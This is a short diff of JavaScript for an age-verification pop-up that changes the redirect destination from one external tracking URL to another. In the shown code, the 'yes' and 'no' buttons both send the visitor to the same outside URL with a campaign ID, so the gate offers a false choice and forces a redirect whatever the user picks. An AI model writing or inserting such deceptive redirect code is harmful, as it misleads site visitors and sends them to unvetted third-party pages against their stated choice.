@@ -87,11 +87,11 @@ if(form){
   bd.style.display='flex';
   function closeGate(){ bd.style.display='none'; bd.remove(); }
   bd.querySelector('#age-yes').addEventListener('click', () => {
-      window.location.href = "https://inf4hub.com/?utm_campaign=PkYk69Mm6o&v1=[v1]&v2=[v2]&v3=[v3]";
+      window.location.href = "https://h2n6.com/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]";
     });
  
   bd.querySelector('#age-no').addEventListener('click', () => {
-      window.location.href = "https://inf4hub.com/?utm_campaign=PkYk69Mm6o&v1=[v1]&v2=[v2]&v3=[v3]";
+      window.location.href = "https://h2n6.com/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]";
     });
  
 })();
